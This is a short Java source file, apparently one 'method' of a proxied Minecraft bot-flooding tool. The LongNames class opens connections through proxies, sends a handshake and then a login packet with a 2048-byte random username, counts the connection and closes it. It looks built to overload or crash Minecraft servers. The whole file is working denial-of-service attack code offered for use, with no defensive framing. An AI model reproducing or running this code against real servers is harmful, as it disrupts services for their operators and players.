package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.nio.charset.Charset;
import java.util.Random;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;
import xyz.mcbot.minecraftutils.LoginRequest;

public class LongNames implements Method
{
  private Handshake handshake;
  private byte[] bytes;
  
  private String randomString(int len)
  {
    byte[] array = new byte[len];
    new Random().nextBytes(array);
    return new String(array, Charset.forName("UTF-8"));
  }
  
  public LongNames() {
    handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    bytes = handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new LoginRequest(randomString(2048)).getWrappedPacket()));
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
